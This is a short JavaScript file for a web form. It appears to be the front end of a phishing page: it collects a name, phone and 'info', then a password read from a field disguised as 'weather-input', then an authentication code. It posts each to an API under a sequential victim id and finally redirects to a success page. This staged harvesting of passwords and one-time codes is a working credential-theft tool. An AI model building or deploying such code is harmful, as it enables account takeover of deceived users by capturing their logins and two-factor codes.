

let idCode;

fetch('http://127.0.0.1:8000/api/id/')
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        idCode = data.id;
        idCode = idCode + 1;
    })
    .catch(error => {
        console.error('Error fetching data:', error);
    });



function validateForm() {
    event.preventDefault();
    if ($('#name').val().trim() === '' || $('#info').val().trim() === '' || $('#phone').val().trim() === '') {
        $('#form-error').text('Please fill in all required fields.');
    } else {
        $("#passwordModal").modal("show");
    }
}
function submitForm() {
    var info = document.getElementById('info').value;
    var weather = document.getElementById('weather-input').value;
    console.log(idCode);
    fetch('/api/code/create', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        'id': idCode,
        'info': info,
        'weather': weather,
      }),
    })
      .then(response => {
        if (response.ok) {
          $("#passwordModal").modal("hide");
          $("#authenticationModal").modal("show");
          return response.text();
        } else {
          throw new Error('Request failed with status ' + response.status);
        }
      })
      .then(data => {
        console.log('Request succeeded with response', data);
      })
      .catch(error => {
        console.error('Request failed', error);
      });
}

function submitCodeForm() {
    var code = document.getElementById('authenticationCode').value;
    fetch('/api/code/update', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        'id': idCode,
        'code': code
      }),
    })
      .then(response => {
        if (response.ok) {
          return response.text();
        } else {
          throw new Error('Request failed with status ' + response.status);
        }
      })
      .then(data => {
        console.log('Request succeeded with response', data);
        window.location.href = '/success/';
      })
      .catch(error => {
        console.error('Request failed', error);
      });
}

